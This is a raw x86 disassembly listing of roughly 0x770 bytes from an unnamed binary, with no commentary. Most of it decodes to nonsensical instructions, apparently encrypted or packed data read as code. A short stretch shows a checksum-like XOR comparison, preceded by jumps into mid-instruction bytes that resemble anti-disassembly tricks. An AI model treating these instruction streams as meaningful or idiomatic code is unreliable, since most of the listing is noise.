  41c764:	ror    DWORD PTR [edi+0x67727aef],0xc8
  41c76b:	inc    esi
  41c76c:	fild   WORD PTR [esi+0x65210d62]
  41c772:	enter  0x540e,0xde
  41c776:	iret   
  41c777:	jns    0x41c738
  41c779:	jmp    0x4d8:0x10412a5e
  41c780:	outs   dx,DWORD PTR ds:[esi]
  41c781:	leave  
  41c782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c783:	in     al,dx
  41c784:	fistp  DWORD PTR [eax-0x49c3977c]
  41c78a:	lock aad 0x5b
  41c78d:	in     eax,dx
  41c78e:	fimul  DWORD PTR [edx]
  41c790:	popf   
  41c791:	cld    
  41c792:	shr    BYTE PTR [ebp-0xd],cl
  41c795:	dec    esp
  41c796:	add    eax,0x9cbae43f
  41c79b:	mov    al,ds:0x2e35688d
  41c7a0:	push   0xffffffd6
  41c7a2:	std    
  41c7a3:	dec    ebx
  41c7a4:	lods   eax,DWORD PTR ds:[esi]
  41c7a5:	cmp    cl,al
  41c7a7:	jmp    0x10e0263e
  41c7ac:	jl     0x41c800
  41c7ae:	sbb    ebx,DWORD PTR [ecx]
  41c7b0:	jmp    0xd11b:0xf99733bb
  41c7b7:	inc    ebp
  41c7b8:	inc    ecx
  41c7b9:	pop    ss
  41c7ba:	mov    cl,0xb9
  41c7bc:	adc    bl,BYTE PTR [eax-0x1e417fa1]
  41c7c2:	out    0x8c,al
  41c7c4:	out    0x10,al
  41c7c6:	nop
  41c7c7:	or     esi,ebx
  41c7c9:	int    0xe6
  41c7cb:	sbb    eax,0x959468cd
  41c7d0:	je     0x41c81c
  41c7d2:	pop    ss
  41c7d3:	pop    ss
  41c7d4:	repnz cs out dx,eax
  41c7d7:	dec    ebp
  41c7d8:	es push edx
  41c7da:	sub    ch,cl
  41c7dc:	stos   BYTE PTR es:[edi],al
  41c7dd:	adc    BYTE PTR [edx-0x3d],dh
  41c7e0:	dec    esp
  41c7e1:	add    eax,ebp
  41c7e3:	xor    al,0x16
  41c7e5:	inc    ebx
  41c7e6:	mov    ebp,0xd8ca6c57
  41c7eb:	add    BYTE PTR [ebx-0x69],al
  41c7ee:	lods   eax,DWORD PTR ds:[esi]
  41c7ef:	add    DWORD PTR [ecx],ebx
  41c7f1:	dec    esp
  41c7f2:	jecxz  0x41c7e8
  41c7f4:	mov    DWORD PTR [edi],esi
  41c7f6:	outs   dx,DWORD PTR ds:[esi]
  41c7f7:	shl    BYTE PTR [eax-0xc96b91f],0x8
  41c7fe:	mov    esi,0x53677d23
  41c803:	inc    esi
  41c804:	mov    cs,WORD PTR [ebp-0x5b741fd0]
  41c80a:	and    BYTE PTR [ebp-0x72],ah
  41c80d:	add    ebp,edi
  41c80f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c810:	cmp    al,0xd3
  41c812:	enter  0x6c9a,0xab
  41c816:	mov    ebp,0x4e8568fa
  41c81b:	inc    edi
  41c81c:	pop    es
  41c81d:	scas   al,BYTE PTR es:[edi]
  41c81e:	push   edi
  41c81f:	pop    ss
  41c820:	mov    al,0x81
  41c822:	xor    al,0xbd
  41c824:	pushf  
  41c825:	adc    DWORD PTR [ecx+0x7f],ecx
  41c828:	data16 cld 
  41c82a:	dec    ebp
  41c82b:	jo     0x41c83d
  41c82d:	pop    eax
  41c82e:	pop    esi
  41c82f:	loopne 0x41c837
  41c831:	cs jecxz 0x41c8ab
  41c834:	and    al,0x6a
  41c836:	push   es
  41c837:	pop    esp
  41c838:	hlt    
  41c839:	mov    eax,0x161177a6
  41c83e:	(bad)  [edx+0xa]
  41c841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c842:	xchg   ah,dl
  41c844:	inc    ebp
  41c845:	mov    ds:0x6d66d29d,al
  41c84a:	bound  eax,QWORD PTR [eax+0x5b70d291]
  41c850:	adc    al,BYTE PTR [eax]
  41c852:	shr    al,cl
  41c854:	jmp    0x41c83e
  41c856:	push   0xfffffffa
  41c858:	and    al,0x16
  41c85a:	shl    DWORD PTR [ebx],1
  41c85c:	fldenv [ecx+ebp*2]
  41c85f:	adc    eax,DWORD PTR ds:0xfc7786d3
  41c865:	retf   
  41c866:	mov    ch,0xf4
  41c868:	pop    esp
  41c869:	xor    al,0x78
  41c86b:	daa    
  41c86c:	std    
  41c86d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c86e:	fdivr  DWORD PTR [esi]
  41c870:	pusha  
  41c871:	xchg   edx,eax
  41c872:	dec    eax
  41c873:	or     esi,DWORD PTR [ebp+edx*1+0x3]
  41c877:	push   ds
  41c878:	dec    edx
  41c879:	xor    esi,edi
  41c87b:	xor    BYTE PTR [ecx-0x4c],0x6d
  41c87f:	add    eax,0x5404b8ed
  41c884:	ss jns 0x41c840
  41c887:	and    edi,edi
  41c889:	je     0x41c8af
  41c88b:	je     0x41c88c
  41c88d:	je     0x41c8b3
  41c88f:	je     0x41c890
  41c891:	je     0x41c8b7
  41c893:	and    al,0xff
  41c895:	je     0x41c8bb
  41c897:	and    al,0xe8
  41c899:	imul   edx,DWORD PTR [ecx+0x548bffff],0x448b1824
  41c8a3:	and    al,0x1c
  41c8a5:	mov    ecx,DWORD PTR [esp+0x18]
  41c8a9:	mov    edi,DWORD PTR [esp+0x1c]
  41c8ad:	shrd   edx,eax,0x2
  41c8b1:	shr    eax,0x2
  41c8b4:	shl    ecx,0x1e
  41c8b7:	xor    ecx,ecx
  41c8b9:	mov    eax,0x329e695d
  41c8be:	xor    edx,eax
  41c8c0:	or     ecx,edx
  41c8c2:	mov    edx,DWORD PTR [esp+0x5c]
  41c8c6:	mov    DWORD PTR [edx],ecx
  41c8c8:	mov    ecx,DWORD PTR [esp+0x18]
  41c8cc:	mov    edx,DWORD PTR [esp+0x1c]
  41c8d0:	shrd   ecx,edx,0x2
  41c8d4:	xor    ecx,eax
  41c8d6:	mov    eax,DWORD PTR [esp+0x18]
  41c8da:	shl    eax,0x1e
  41c8dd:	shr    edx,0x2
  41c8e0:	mov    edx,DWORD PTR [esp+0x1c]
  41c8e4:	xor    eax,eax
  41c8e6:	or     eax,ecx
  41c8e8:	mov    ecx,DWORD PTR [esp+0x68]
  41c8ec:	mov    DWORD PTR [ecx],eax
  41c8ee:	mov    eax,DWORD PTR [esp+0x68]
  41c8f2:	mov    ecx,DWORD PTR [esp+0x68]
  41c8f6:	mov    eax,DWORD PTR [eax]
  41c8f8:	cmp    eax,DWORD PTR [ecx]
  41c8fa:	jne    0x41d531
  41c900:	mov    eax,DWORD PTR [esp+0x5c]
  41c904:	mov    ecx,DWORD PTR [esp+0x5c]
  41c908:	mov    eax,DWORD PTR [eax]
  41c90a:	cmp    eax,DWORD PTR [ecx]
  41c90c:	jne    0x41d531
  41c912:	mov    BYTE PTR [esp+0x2c],0x20
  41c917:	mov    BYTE PTR [esp+0x38],0x3
  41c91c:	mov    BYTE PTR [esp+0x3c],0x6d
  41c921:	mov    BYTE PTR [esp+0x2b],0x90
  41c926:	mov    al,BYTE PTR [esp+0x2b]
  41c92a:	jmp    0x41ccf9
  41c92f:	push   ebp
  41c930:	and    al,0x97
  41c932:	shl    DWORD PTR [esi-0x5e],cl
  41c935:	push   ebp
  41c936:	and    dh,ch
  41c938:	jmp    DWORD PTR [ebx-0x44]
  41c93b:	call   0xefacc1e3
  41c940:	imul   edx,DWORD PTR [esi],0x18
  41c943:	mov    esp,0x7e181812
  41c948:	cmp    DWORD PTR [ebp+0x3d763328],ecx
  41c94e:	push   0x97147779
  41c953:	jo     0x41c972
  41c955:	dec    esi
  41c956:	pop    ds
  41c957:	pushf  
  41c958:	mov    ch,0xd6
  41c95a:	xchg   ah,al
  41c95c:	sbb    al,0xa4
  41c95e:	out    0x5b,eax
  41c960:	sti    
  41c961:	ins    BYTE PTR es:[edi],dx
  41c962:	mov    dl,0x63
  41c964:	jp     0x41c988
  41c966:	jne    0x41c925
  41c968:	push   ss
  41c969:	jae    0x41c9e0
  41c96b:	std    
  41c96c:	js     0x41c9ba
  41c96e:	sub    BYTE PTR [edx],al
  41c970:	mov    ?,eax
  41c972:	jns    0x41c961
  41c974:	dec    ebp
  41c975:	out    dx,eax
  41c976:	pop    edx
  41c977:	es pop eax
  41c979:	sub    BYTE PTR [edi],al
  41c97b:	loope  0x41c9e7
  41c97d:	int3   
  41c97e:	hlt    
  41c97f:	pxor   mm5,QWORD PTR [ecx]
  41c982:	leave  
  41c983:	cmp    bh,0x54
  41c986:	call   0x5dfe:0x88582a25
  41c98d:	pop    ds
  41c98e:	sbb    BYTE PTR [eax-0xd],al
  41c991:	lods   al,BYTE PTR ds:[esi]
  41c992:	repz cld 
  41c994:	test   DWORD PTR [eax+0x7bb1b865],esp
  41c99a:	jmp    0x41c9d1
  41c99c:	(bad)  
  41c99d:	out    0x38,eax
  41c99f:	bound  edx,QWORD PTR [ebx]
  41c9a1:	loop   0x41c9fa
  41c9a3:	add    eax,0x6b56e41f
  41c9a8:	dec    ecx
  41c9aa:	cmp    ch,ch
  41c9ac:	cld    
  41c9ad:	es adc eax,0xab3e80eb
  41c9b3:	add    DWORD PTR [ebp-0x56],ecx
  41c9b6:	mov    ?,WORD PTR [eax]
  41c9b8:	iret   
  41c9b9:	rcr    al,0x90
  41c9bc:	inc    edx
  41c9bd:	and    edx,DWORD PTR [edx]
  41c9bf:	and    edx,eax
  41c9c1:	in     eax,0x81
  41c9c3:	std    
  41c9c4:	and    eax,0x68fdf36d
  41c9c9:	sub    cl,BYTE PTR [ebx]
  41c9cb:	sub    BYTE PTR [eax+0x4],bh
  41c9ce:	jg     0x41c9ab
  41c9d0:	into   
  41c9d1:	scas   al,BYTE PTR es:[edi]
  41c9d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9d3:	imul   ecx,eax,0xc27ef7c8
  41c9d9:	rcr    BYTE PTR [edx],1
  41c9db:	cmp    BYTE PTR [eax-0x2f23b092],bh
  41c9e1:	sahf   
  41c9e2:	repnz int3 
  41c9e4:	inc    ecx
  41c9e5:	sub    BYTE PTR [edi],al
  41c9e7:	adc    eax,0x2d643085
  41c9ec:	(bad)  
  41c9ed:	cmp    al,0x89
  41c9ef:	jl     0x41ca6d
  41c9f1:	not    al
  41c9f3:	loop   0x41ca48
  41c9f5:	xor    al,0x49
  41c9f7:	div    BYTE PTR [edx-0x1c]
  41c9fa:	aas    
  41c9fb:	push   esi
  41c9fc:	test   DWORD PTR [eax],0x3ded3788
  41ca02:	xor    BYTE PTR [esi+0x2a04ea64],dh
  41ca08:	jnp    0x41ca89
  41ca0a:	mov    eax,ds:0x21c955a1
  41ca0f:	xor    DWORD PTR [esi+0x24],0xffffff86
  41ca13:	cmp    ah,BYTE PTR [ebx]
  41ca15:	lods   al,BYTE PTR ds:[esi]
  41ca16:	sbb    bh,bh
  41ca18:	fild   QWORD PTR [edi-0x337158c]
  41ca1e:	dec    edi
  41ca1f:	das    
  41ca20:	adc    al,0xe4
  41ca22:	adc    al,0xbe
  41ca24:	outs   dx,BYTE PTR ds:[si]
  41ca26:	test   al,0x79
  41ca28:	add    eax,0xc67e97c4
  41ca2d:	icebp  
  41ca2e:	lods   eax,DWORD PTR ds:[esi]
  41ca2f:	imul   eax,DWORD PTR [edi-0x52],0x5f
  41ca33:	scas   eax,DWORD PTR es:[edi]
  41ca34:	stos   BYTE PTR es:[edi],al
  41ca35:	out    0x26,al
  41ca37:	pop    ebp
  41ca38:	xchg   BYTE PTR [ebx+0x35],dh
  41ca3b:	out    dx,eax
  41ca3c:	sbb    al,0x3b
  41ca3e:	cdq    
  41ca3f:	fcomp  QWORD PTR [esi+0x67c7fc0c]
  41ca45:	xchg   ebp,eax
  41ca46:	mov    eax,ds:0x9f8316c0
  41ca4b:	gs (bad) 
  41ca4d:	mul    BYTE PTR [edx+0x6a]
  41ca50:	es retf 
  41ca52:	cmp    al,0x63
  41ca54:	int    0x28
  41ca56:	bound  edi,QWORD PTR [edi]
  41ca58:	popf   
  41ca59:	test   bh,ah
  41ca5b:	sbb    BYTE PTR [esi],dh
  41ca5d:	stos   DWORD PTR es:[edi],eax
  41ca5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca5f:	xor    al,0x4c
  41ca61:	mov    dl,BYTE PTR ds:[ebp+0x44]
  41ca65:	lock xchg DWORD PTR [eax],esi
  41ca68:	imul   esp,edx,0xcb6a42d9
  41ca6e:	adc    al,0x54
  41ca70:	mov    bl,0xb
  41ca72:	or     DWORD PTR [ebp-0x72],ebx
  41ca75:	mov    edi,0xb05a1273
  41ca7a:	inc    esp
  41ca7b:	and    eax,0x2c5cef14
  41ca80:	(bad)  
  41ca81:	fs cdq 
  41ca83:	test   eax,0xa24b9078
  41ca88:	call   0x9a9cc274
  41ca8d:	mov    dl,0x8f
  41ca8f:	xor    esp,0x744655f6
  41ca95:	clc    
  41ca96:	cmp    eax,0x2809263b
  41ca9b:	in     eax,dx
  41ca9c:	mov    bh,0x27
  41ca9e:	mov    eax,0x4d90348e
  41caa3:	pop    ecx
  41caa4:	in     al,dx
  41caa5:	fidivr WORD PTR [esi-0x68cda30f]
  41caab:	sub    eax,0x1d294272
  41cab0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cab1:	jecxz  0x41ca46
  41cab3:	xchg   ecx,edi
  41cab5:	pushf  
  41cab6:	out    dx,al
  41cab7:	xchg   edx,eax
  41cab8:	jge    0x41ca6c
  41caba:	inc    eax
  41cabb:	and    esi,DWORD PTR [eax-0x2e]
  41cabe:	add    DWORD PTR [edx+0x45],edi
  41cac1:	inc    ebp
  41cac2:	xlat   BYTE PTR ds:[ebx]
  41cac3:	jne    0x41cab2
  41cac5:	jns    0x41cab7
  41cac7:	jmp    0x41cad7
  41cac9:	fstp   TBYTE PTR [ecx]
  41cacb:	sub    DWORD PTR [edx],ebx
  41cacd:	inc    ecx
  41cace:	pop    ds
  41cacf:	call   0x77ed05fe
  41cad4:	jns    0x41cafe
  41cad6:	mov    esi,0x5766fc6e
  41cadb:	mov    eax,DWORD PTR [edi-0x5a]
  41cade:	gs retf 0x5959
  41cae2:	call   0x4a9d:0x77a82005
  41cae9:	mov    ds:0x3974c9e,eax
  41caee:	cli    
  41caef:	test   DWORD PTR [ebx-0x6f99e6bb],ecx
  41caf5:	out    dx,al
  41caf6:	shl    BYTE PTR [edx+0x49],1
  41caf9:	jg     0x41cb37
  41cafb:	dec    esi
  41cafc:	cdq    
  41cafd:	mov    ah,BYTE PTR [ebp-0x1ceb6dcc]
  41cb03:	cwde   
  41cb04:	adc    eax,0x67c1a601
  41cb09:	sbb    BYTE PTR [eax+ebp*1+0x5021e7b9],cl
  41cb10:	out    0xba,eax
  41cb12:	imul   edx,DWORD PTR [eax],0xffffffba
  41cb15:	inc    ebp
  41cb16:	mov    dh,0x51
  41cb18:	pop    edx
  41cb19:	and    dl,BYTE PTR [esi+0x371a7e0e]
  41cb1f:	sbb    eax,0xa19558e8
  41cb24:	mov    bl,0xce
  41cb26:	fcomp  QWORD PTR [edx+0x56ed0ca4]
  41cb2c:	sbb    eax,0x5b748217
  41cb31:	push   ebp
  41cb32:	into   
  41cb33:	cmp    eax,0x279e72e2
  41cb38:	pop    ss
  41cb39:	jmp    0x41cb94
  41cb3b:	xchg   esp,eax
  41cb3c:	sub    DWORD PTR [esi+0x49],eax
  41cb3f:	je     0x41cb7c
  41cb41:	clc    
  41cb42:	jmp    0xfc89:0x4302078b
  41cb49:	add    al,0xb9
  41cb4b:	stc    
  41cb4c:	mov    al,ds:0x6e35fd9d
  41cb51:	pop    ds
  41cb52:	mov    dh,0xbd
  41cb54:	xor    DWORD PTR [edx+ebp*1+0x26],ecx
  41cb58:	ja     0x41cb43
  41cb5a:	mov    edx,ebp
  41cb5c:	cs xchg esp,eax
  41cb5e:	bound  eax,QWORD PTR [ecx+0x10f0e42c]
  41cb64:	idiv   BYTE PTR [ecx]
  41cb66:	xchg   ecx,eax
  41cb67:	ffreep st(0)
  41cb69:	pop    ss
  41cb6a:	repz retf 0xb2a4
  41cb6e:	sub    al,0x5b
  41cb70:	and    BYTE PTR [ebx+0x5a9fab8],ah
  41cb76:	std    
  41cb77:	adc    DWORD PTR [ecx+edi*1],esi
  41cb7a:	sub    ah,BYTE PTR ds:0xe858787f
  41cb80:	fs pop ss
  41cb82:	loopne 0x41cbdb
  41cb84:	adc    al,BYTE PTR [ebx-0x13]
  41cb87:	sub    edi,DWORD PTR [ecx+0x516c03c9]
  41cb8d:	ja     0x41cb33
  41cb8f:	add    DWORD PTR [esi-0x72],ebx
  41cb92:	and    BYTE PTR [eax],0x84
  41cb95:	add    cl,BYTE PTR [eax]
  41cb97:	test   al,0x2f
  41cb99:	fs pop edx
  41cb9b:	push   cs
  41cb9c:	inc    ebx
  41cb9d:	repz ss dec edx
  41cba0:	cmp    edi,esi
  41cba2:	push   ss
  41cba3:	pusha  
  41cba4:	shl    DWORD PTR ds:0xf0a7ef2f,1
  41cbaa:	inc    ebx
  41cbab:	fdivr  DWORD PTR [edi-0x7a]
  41cbae:	ins    BYTE PTR es:[edi],dx
  41cbaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbb0:	popa   
  41cbb1:	nop
  41cbb2:	push   esi
  41cbb3:	push   eax
  41cbb4:	es mul dh
  41cbb7:	js     0x41cb40
  41cbb9:	stos   BYTE PTR es:[edi],al
  41cbba:	(bad)  
  41cbbb:	lock push ecx
  41cbbd:	mov    eax,0xa8709dd5
  41cbc2:	push   edi
  41cbc3:	inc    esi
  41cbc4:	push   ebx
  41cbc5:	mov    dl,0xa2
  41cbc7:	fcomi  st,st(2)
  41cbc9:	fwait
  41cbca:	je     0x41cb77
  41cbcc:	mov    ah,0x85
  41cbce:	(bad)  
  41cbcf:	push   ecx
  41cbd0:	mov    eax,ds:0x83ae0f87
  41cbd5:	shr    BYTE PTR [ecx+0x39462ccb],cl
  41cbdb:	pop    ecx
  41cbdc:	sub    ebx,DWORD PTR [ebx+0x78e02f3e]
  41cbe2:	cs (bad) 
  41cbe4:	jg     0x41cb93
  41cbe6:	cmp    eax,0xb3b7ab0e
  41cbeb:	ja     0x41cc0d
  41cbed:	popf   
  41cbee:	adc    edi,DWORD PTR [ebx-0x192a0ab8]
  41cbf4:	jge    0x41cb9d
  41cbf6:	dec    esi
  41cbf7:	jno    0x41cbe3
  41cbf9:	ret    
  41cbfa:	(bad)  
  41cbfb:	and    al,0x8d
  41cbfd:	cwde   
  41cbfe:	retf   0x4990
  41cc01:	mov    edi,0xfe75829b
  41cc06:	and    BYTE PTR [eax+0x189a97c2],al
  41cc0c:	sub    DWORD PTR [edi+0x68ccb2db],edi
  41cc12:	stc    
  41cc13:	popf   
  41cc14:	pop    ecx
  41cc15:	xor    al,0xf6
  41cc17:	mov    ebp,ebx
  41cc19:	pop    ecx
  41cc1a:	sbb    edx,DWORD PTR [ebx-0x6a61207f]
  41cc20:	in     al,dx
  41cc21:	shl    BYTE PTR [esi+0x51ace3dd],0x71
  41cc28:	inc    ecx
  41cc29:	inc    edi
  41cc2a:	jle    0x41cc4d
  41cc2c:	sbb    BYTE PTR [edi+0x59],al
  41cc2f:	sub    esi,DWORD PTR [edi-0x128e8a2e]
  41cc35:	cmc    
  41cc36:	push   ebx
  41cc37:	and    al,0x43
  41cc39:	cli    
  41cc3a:	rcl    BYTE PTR [edi],0x8b
  41cc3d:	cdq    
  41cc3e:	retf   0xd7ca
  41cc41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc42:	addr16 jmp 0xd3d1:0xea75dc0c
  41cc4a:	mov    dl,BYTE PTR [ebx+0x49]
  41cc4d:	pop    edx
  41cc4e:	jns    0x41ccbd
  41cc50:	(bad)  
  41cc51:	sub    dh,dh
  41cc53:	xor    bl,cl
  41cc55:	pop    edx
  41cc56:	jno    0x41cc53
  41cc58:	ins    DWORD PTR es:[edi],dx
  41cc59:	adc    eax,0x88c25d92
  41cc5e:	fcomi  st,st(7)
  41cc60:	add    eax,0xd48f94fe
  41cc65:	push   esi
  41cc66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc67:	test   eax,0x202d7489
  41cc6c:	mov    cl,0xba
  41cc6e:	pop    eax
  41cc6f:	mov    eax,ds:0x23183c4
  41cc74:	or     al,0x7e
  41cc76:	push   edx
  41cc77:	jp     0x41cbfd
  41cc79:	or     esi,ebx
  41cc7b:	repz mov ds:0xe2376415,eax
  41cc81:	test   dh,dh
  41cc83:	scas   eax,DWORD PTR es:[edi]
  41cc84:	mov    bh,0xaa
  41cc86:	inc    ebx
  41cc87:	jo     0x41cc16
  41cc89:	xchg   ebx,eax
  41cc8a:	sbb    DWORD PTR [ebx+0x6e6429c8],ebp
  41cc90:	bound  edx,QWORD PTR ds:0xb4223cb8
  41cc96:	sub    cl,ah
  41cc98:	pop    ss
  41cc99:	inc    esi
  41cc9a:	sbb    eax,0xc3839c9a
  41cc9f:	cmp    eax,0x51623f7b
  41cca4:	pop    edx
  41cca5:	adc    BYTE PTR [ebp-0x1f],cl
  41cca8:	add    BYTE PTR [ebp-0x17],0xc4
  41ccac:	sbb    esi,edi
  41ccae:	call   0x3e15:0xe3b45638
  41ccb5:	retf   0x99c8
  41ccb8:	add    eax,DWORD PTR [edi-0x230fd83a]
  41ccbe:	jmp    0x52a796e0
  41ccc3:	or     BYTE PTR [ebx],al
  41ccc5:	adc    BYTE PTR es:[edi+0x7d],bh
  41ccc9:	dec    edi
  41ccca:	pop    esp
  41cccb:	ss or  al,0xc8
  41ccce:	push   ebx
  41cccf:	mov    ds:0x5bf28905,eax
  41ccd4:	push   ebx
  41ccd5:	mov    ebx,eax
  41ccd7:	push   cs
  41ccd8:	mov    edi,0xcb2709d4
  41ccdd:	or     al,dl
  41ccdf:	push   ebp
  41cce0:	(bad)  
  41cce1:	mov    esp,0xea682f3b
  41cce6:	pop    ebx
  41cce7:	aas    
  41cce8:	loop   0x41cd48
  41ccea:	xor    al,0x81
  41ccec:	adc    ecx,DWORD PTR [edi+0x58a4110c]
  41ccf2:	jecxz  0x41ccb7
  41ccf4:	hlt    
  41ccf5:	aam    0x9f
  41ccf7:	sti    
  41ccf8:	inc    ebp
  41ccf9:	mov    cl,BYTE PTR [esp+0x3c]
  41ccfd:	or     al,0xdc
  41ccff:	jmp    0x41d0ce
  41cd04:	fimul  WORD PTR [esi+0x16]
  41cd07:	jle    0x41cd30
  41cd09:	ds pop esi
  41cd0b:	cs je  0x41cd75
  41cd0e:	xchg   edi,eax
  41cd0f:	mov    esp,0xb0bf7264
  41cd14:	xchg   ebx,eax
  41cd15:	arpl   WORD PTR [esi],dx
  41cd17:	sbb    BYTE PTR [edx+edx*1+0x76901818],bh
  41cd1e:	mov    dh,0x31
  41cd20:	xchg   ecx,eax
  41cd21:	add    BYTE PTR [eax],dl
  41cd23:	pop    ds
  41cd24:	rcl    BYTE PTR [edi+0x60],0xcc
  41cd28:	xchg   ebp,eax
  41cd29:	sbb    BYTE PTR [eax+ebx*1],cl
  41cd2c:	sbb    al,cl
  41cd2e:	fistp  DWORD PTR [edi-0x6b]
  41cd31:	popa   
  41cd32:	sbb    BYTE PTR [esi-0x837a894],dh
  41cd38:	shr    DWORD PTR [edi+ebx*1],0x4e
  41cd3c:	jae    0x41cd94
  41cd3e:	xchg   esi,eax
  41cd3f:	cmp    BYTE PTR [eax],bl
  41cd41:	cmp    BYTE PTR [esi-0x6a],ah
  41cd44:	cmp    ah,BYTE PTR [edi+0x70]
  41cd47:	int3   
  41cd48:	pop    edi
  41cd49:	sbb    bl,BYTE PTR [ebx+0x74]
  41cd4c:	sbb    al,0x96
  41cd4e:	inc    ecx
  41cd4f:	out    dx,al
  41cd50:	je     0x41cd7b
  41cd52:	call   esi
  41cd54:	sub    BYTE PTR [esi],0x4f
  41cd57:	mov    ch,0xc7
  41cd59:	xor    bh,BYTE PTR [esi+0x3e6c0995]
  41cd5f:	pusha  
  41cd60:	pop    edi
  41cd61:	shl    DWORD PTR [edx+edx*8+0xa54d70c],cl
  41cd68:	lds    ecx,FWORD PTR [edx]
  41cd6a:	data16 sub BYTE PTR ds:[ebx+0x63740dc],ah
  41cd72:	dec    eax
  41cd73:	jmp    FWORD PTR [esi+ebx*4]
  41cd76:	(bad)  
  41cd77:	pushf  
  41cd78:	push   esp
  41cd79:	xor    al,0x97
  41cd7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd7c:	jbe    0x41cd08
  41cd7e:	xlat   BYTE PTR ds:[ebx]
  41cd7f:	inc    ecx
  41cd80:	int    0x3a
  41cd82:	adc    ecx,ebp
  41cd84:	sub    DWORD PTR [edi-0x46622fb],ebp
  41cd8a:	leave  
  41cd8b:	test   eax,0x17ca3be3
  41cd90:	add    al,0x41
  41cd92:	sub    al,0xb8
  41cd94:	mov    sp,0x5fbf
  41cd98:	stc    
  41cd99:	and    DWORD PTR [edi-0x27],esp
  41cd9c:	and    BYTE PTR [ebx],dl
  41cd9e:	ret    0x96b7
  41cda1:	push   edx
  41cda2:	int3   
  41cda3:	pusha  
  41cda4:	fiadd  DWORD PTR [edi]
  41cda6:	mov    bh,0x72
  41cda8:	mov    ebx,0xd0617345
  41cdad:	push   edx
  41cdae:	jbe    0x41cdcc
  41cdb0:	mov    al,0x88
  41cdb2:	aam    0x2a
  41cdb4:	mov    WORD PTR [ecx+0x27ec8b33],fs
  41cdba:	cmp    ch,BYTE PTR [eax-0x31]
  41cdbd:	sbb    cl,BYTE PTR [ebp+ebp*8+0x3c201e79]
  41cdc4:	and    al,0x32
  41cdc6:	jne    0x41ce1c
  41cdc8:	dec    eax
  41cdc9:	lahf   
  41cdca:	vmovss xmm1,xmm5,xmm2
  41cdce:	jp     0x41cdf0
  41cdd0:	sbb    eax,0xc0abd28a
  41cdd5:	ins    BYTE PTR es:[edi],dx
  41cdd6:	aaa    
  41cdd7:	jecxz  0x41ce1b
  41cdd9:	jge    0x41cdd1
  41cddb:	pop    ds
  41cddc:	adc    BYTE PTR [esi],bh
  41cdde:	adc    ebp,DWORD PTR [ecx]
  41cde0:	jmp    0x511b:0x8696a82c
  41cde7:	outs   dx,BYTE PTR ds:[esi]
  41cde8:	pop    ebx
  41cde9:	sub    eax,0xecc5a317
  41cdee:	test   eax,0x2a98d2b
  41cdf3:	js     0x41ce38
  41cdf5:	pop    esp
  41cdf6:	jnp    0x41cdcb
  41cdf8:	aad    0xc2
  41cdfa:	arpl   WORD PTR [ecx-0x3],sp
  41cdfd:	push   ds
  41cdfe:	lds    esi,FWORD PTR [ebx+0x32204816]
  41ce04:	jmp    0x9e2:0x5d41707c
  41ce0b:	mov    ebx,0x26c955cc
  41ce10:	xchg   esi,eax
  41ce11:	jbe    0x41cdfb
  41ce13:	inc    ecx
  41ce14:	in     al,0x88
  41ce16:	call   0x4748e534
  41ce1b:	bnd call 0xf7094bcd
  41ce21:	xchg   DWORD PTR [ebx-0x67c66986],eax
  41ce27:	xor    eax,0x38079b71
  41ce2c:	pop    edx
  41ce2d:	jne    0x41ce97
  41ce2f:	pop    ecx
  41ce30:	jnp    0x41ce29
  41ce32:	jmp    0xea41a733
  41ce37:	dec    eax
  41ce38:	into   
  41ce39:	clc    
  41ce3a:	xchg   ebp,eax
  41ce3b:	jmp    0x99da:0x55615e8e
  41ce42:	ud0    ebp,esi
  41ce45:	repnz cdq 
  41ce47:	mov    BYTE PTR [esi-0x26],dh
  41ce4a:	mov    ecx,0xe58b13a2
  41ce4f:	outs   dx,BYTE PTR ds:[esi]
  41ce50:	pop    esp
  41ce51:	imul   esi,DWORD PTR [ecx+ecx*4],0x78
  41ce55:	sar    cl,0xa8
  41ce58:	in     eax,0x75
  41ce5a:	mov    al,0x4a
  41ce5c:	test   eax,0x986ce6f0
  41ce61:	cmp    esi,DWORD PTR [ebx+0x72]
  41ce64:	mov    al,0x23
  41ce66:	mov    al,ds:0x9d004c4c
  41ce6b:	xor    DWORD PTR [ecx+ebx*2-0x31b65736],ecx
  41ce72:	adc    ebx,DWORD PTR [edi+0x87c4c94]
  41ce78:	test   eax,0x11d7491c
  41ce7d:	test   DWORD PTR [edx+edi*2-0x3a],esi
  41ce81:	into   
  41ce82:	shr    DWORD PTR [esi],1
  41ce84:	and    edx,DWORD PTR gs:[edx]
  41ce87:	cli    
  41ce88:	pop    es
  41ce89:	adc    dh,0x50
  41ce8c:	retf   0xffe9
  41ce8f:	mov    DWORD PTR [edx+ebx*8+0x66c1c5af],ebp
  41ce96:	xor    cl,BYTE PTR [ebx]
  41ce98:	xor    cl,dl
  41ce9a:	xchg   DWORD PTR cs:[eax+0x28],esp
  41ce9e:	adc    ecx,ebx
  41cea0:	shl    DWORD PTR [edi],1
  41cea2:	pop    ebp
  41cea3:	inc    ecx
  41cea4:	xchg   esi,eax
  41cea5:	xor    al,0xa3
  41cea7:	icebp  
  41cea8:	mov    dh,0xbb
  41ceaa:	push   es
  41ceab:	pop    ds
  41ceac:	retf   
  41cead:	pop    eax
  41ceae:	stos   BYTE PTR es:[edi],al
  41ceaf:	shl    DWORD PTR [eax+eax*8+0x1e],cl
  41ceb3:	jae    0x41cee3
  41ceb5:	xor    ebx,DWORD PTR [edx]
  41ceb7:	dec    ebp
  41ceb8:	fs xchg edi,eax
  41ceba:	in     al,dx
  41cebb:	shr    al,1
  41cebd:	fs es (bad) 
  41cec0:	stc    
  41cec1:	loop   0x41ce9d
  41cec3:	(bad)  
  41cec4:	stc    
  41cec5:	push   ecx
  41cec6:	fidiv  WORD PTR ds:[ebx+0x78]
  41ceca:	jo     0x41ce80
  41cecc:	sub    BYTE PTR [ecx-0x3e],cl
  41cecf:	in     al,0xf5
